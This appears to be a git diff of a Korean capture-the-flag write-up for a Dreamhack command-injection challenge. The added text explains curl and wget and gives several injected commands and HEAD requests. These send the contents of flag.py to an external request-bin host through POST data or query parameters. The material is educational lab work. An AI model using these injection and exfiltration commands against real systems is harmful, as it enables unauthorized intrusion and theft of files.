@@ -1,4 +1,4 @@
-<img width="545" alt="image" src="https://github.com/user-attachments/assets/62f54206-0339-48fe-8485-5d817271e45c"># 문제 설명 및 전체 코드
+<img width="609" alt="image" src="https://github.com/user-attachments/assets/28b587ce-9d23-4409-a4ef-23e20a6c9141"># 문제 설명 및 전체 코드
 
 ```
 #!/usr/bin/env python3
@@ -82,7 +82,131 @@ Repeater 탭에서 아래와 같이 Request를 `OPTIONS / HTTP/1.1`로 조작�
 
 외부 서버는 [드림핵 툴즈](https://tools.dreamhack.games/requestbin/aysuaio)의 Request Bin 탭에서 랜덤한 URL을 생성한 후, 해당 URL로 HTTP 요청을 전달받을 수 있고,
 
+<img width="1380" alt="image" src="https://github.com/user-attachments/assets/c33adcee-312d-4053-ba51-43bff10d0ad3">
+
 위에서 생성한 외부 서버로 결과를 보내기 위해서는 시스템 함수에서 쉘의 명령어로 사용할 수 있는, `curl` 또는 `wget` 명령어를 사용하면 된다.
+
+---
+
+`curl`(Client URL)은 주로 웹 서버에 요청을 보내고, 그 결과를 출력하거나 파일로 저장하는 데 사용된다.
+
+HTTP 뿐만 아니라 다양한 프로토콜과 인증 방식 등을 지원하며, REST API 호출, 파일 다운로드, POST 데이터 전송 등 다목적으로 사용된다.
+
+그리고 `wget`(World Wide Web Get)은 주로 파일이나 웹 페이지를 다운로드하는 데 사용된다.
+
+인터넷에서 파일을 자동으로 다운로드하거나 복잡한 다운로드 작업을 수행할 때 많이 사용되지만, HTTP 요청을 보내는데도 사용이 되기 때문에 여기서 이용할 수 있다.
+
+---
+
+그럼 다시 돌아와서, `curl` 명령어를 `cmd`에 전달하여 드림핵 툴즈에서 생성한 랜덤한 URL로 `cat flag.py`의 수행 결과를 보내는 방법을 사용해보자.
+
+Burp Suite에서 워게임 서버에 `HEAD` 메서드를 사용하여, `cmd`에 아래의 두 명령어를 전달하여 문제를 풀이할 수 있다.
+
+### 1. `curl` : 원격 서버에 POST 메서드로 `cat flag.py`의 결과를 데이터에 전송
+
+```
+curl https://yzyozog.request.dreamhack.games -d "$(cat flag.py)"
+```
+
+위 명령어가 시스템 함수에 수행되도록 `HEAD` 요청을 워게임 서버에 전송하면 된다.
+
+`-d` 명령어는 원격 서버에 `POST` 요청을 보낸다는 옵션이며, 바로 뒤의 `$(cat flag.py)`가 해당 요청의 데이터값이다.
+
+`$()`은 명령어의 수행 결과값을 치환하는 메타 문자로, `cat flag.py`가 시스템 함수에서 수행된 후 결과 값이 치환되어 `POST` 요청의 데이터에 저장될 것이다.
+
+``` ` ```를 통해 명령어를 치환해도 똑같은 결과가 나오지만, `$()`이 훨씬 가독성면에서 더 직관적이고, 중첩 상황에서 예외가 발생하지 않기 때문에 많이 사용된다는 것을 참고하자.
+
+참고로, `"$()"`와 달리 `$()`만 사용하여 `""`로 묶어주지 않으면 `flag.py`의 내용이 `FLAG = DH{~}` 이기 때문에, 공백에 따라 데이터가 끊겨서 아래와 같이 `FLAG`만 전달되게 된다.
+
+<img width="595" alt="image" src="https://github.com/user-attachments/assets/e29c99f7-ccc6-4c8a-93c4-a80dcb13f197">
+
+따라서, `curl -d` 를 통해 데이터를 보낼 때는 데이터에 공백이 포함된 경우 `""`로 묶어서 하나의 데이터로 해석되게 해야함을 유의하자.
+
+그리고 Burp Suite에서 `HEAD` 메서드로 원격 서버에 요청을 전달할 때는 **URL 인코딩 형식**으로 보내야 하기 때문에 공백은 `+`로 바꿔서 써야 한다.
+
+따라서 아래의 요청을 전달하면 되고, 드림핵 툴즈에 들어가보면 아래와 같이 `cat flag.py`의 결과값이 전송되는 것을 확인할 수 있다.
+
+```
+HEAD /?cmd=curl+https://offxuuz.request.dreamhack.games+-d+"$(cat+flag.py)" HTTP/1.1
+```
+
+<img width="609" alt="image" src="https://github.com/user-attachments/assets/dacb7c93-16e3-4574-87f7-7971d5235794">
+
+### 2. `curl` : 원격 서버에 GET 메서드로 `cat flag.py`의 결과를 파라미터로 전송
+
+위와 똑같은 방식으로 `GET` 요청을 보내서 아래와 같이 쿼리 파라미터에 데이터를 담아올 수도 있다.
+
+```
+curl https://offxuuz.request.dreamhack.games/?query="$(cat+flag.py)"
+```
+
+위 명령어가 수행되도록 `HEAD` 요청을 보내면 헤더의 QueryString에 `query`의 결과가 담겨온다.
+
+그런데, `""`을 제외하고 요청을 보내면 아래와 같이 `FLAG` 뒷 부분은 공백 때문에 짤리지만, HTTP 요청은 잘 보내진다.
+
+<img width="590" alt="image" src="https://github.com/user-attachments/assets/c9b6cea6-a5c8-4640-9d1b-d7f0fa209eb3">
+
+하지만, `""`로 `$()` 부분을 감싸서 보내면 아예 원격 서버로 HTTP 요청이 보내지지도 않았다.
+
+```
+HEAD /?cmd=curl+https://offxuuz.request.dreamhack.games/?query="$(cat+flag.py)" HTTP/1.1
+```
+
+뭔가 쿼리 파라미터에서는 URL 인코딩이 되어야 하나 생각을 해서 `"`의 인코딩 결과인 `%22`로도 감싸봤지만 똑같이 안됬다.
+
+```
+HEAD /?cmd=curl+https://offxuuz.request.dreamhack.games/?query=%22$(cat+flag.py)%22 HTTP/1.1
+```
+
+해당 이유는 조금 더 공부를 해보고 수정해야겠다. 대부분 `curl`을 보낼 때도 `POST` 메서드를 통해 보내서 딱히 크게 신경쓰지 않아도 되지만 다음에 알아낸 후 수정해보겠다.
+
+### 3. `wget` : 원격 서버에 POST 메서드로 `cat flag.py`의 결과를 파라미터로 전송
+
+```
+wget https://dzmnkob.request.dreamhack.games --method=POST --body-data="$(cat flag.py)"
+```
+
+위 명령어가 시스템 함수에 전달되도록 `HEAD` 메서드를 통해 웹 서버에 전달하면 된다. 그럼 아래와 같이 작성할 수 있다.
+
+```
+HEAD /?cmd=wget+https://dzmnkob.request.dreamhack.games+--method=POST+--body-data="$(cat+flag.py)" HTTP/1.1
+```
+
+위와 같이 작성한 후 전달하면 아래와 같이 `cat flag.py`의 실행 결과가 원격 서버로 잘 전달되는 것을 확인할 수 있다.
+
+<img width="583" alt="image" src="https://github.com/user-attachments/assets/a77e34f5-f755-4a16-bb4a-3f30f8e5cdc8">
+
+마찬가지로 여기서도 `$()` 대신 ``` ` ```을 써도 되고, `""`으로 `cat flag.py`의 실행 결과를 감싸줘야한다.
+
+### 4. `wget` : 원격 서버에 GET 메서드로 `cat flag.py`의 결과를 파라미터로 전송
+
+`wget` 명령어는 `--method`를 정해주지 않으면, 기본적으로 `GET` 메서드를 수행한다.
+
+따라서, 아래와 같은 명령어를 전달해주면 된다.
+
+```
+wget https://dzmnkob.request.dreamhack.games/?query="$(cat flag.py)"
+```
+
+위 명령어가 시스템 함수에 전달되도록 `HEAD` 메서드를 통해 웹 서버에 전달하면 된다. 그럼 아래와 같이 작성할 수 있다.
+
+```
+HEAD /?cmd=wget+https://dzmnkob.request.dreamhack.games/?query="$(cat+flag.py)" HTTP/1.1
+```
+
+이렇게 전달하면, 아래와 같이 QueryString에 실행 결과가 URL 인코딩되어 담겨오는 것을 확인할 수 있다.
+
+<img width="870" alt="image" src="https://github.com/user-attachments/assets/244941fe-6b04-4696-8b0f-644d0de0ded4">
+
+해당 값을 URL 디코딩해보면 똑같이 플래그 문자를 아래와 같이 얻을 수 있다.
+
+<img width="600" alt="image" src="https://github.com/user-attachments/assets/004127bd-cb3e-450e-89b3-291b0949390e">
+
+
+
+
+
+
 
 
 
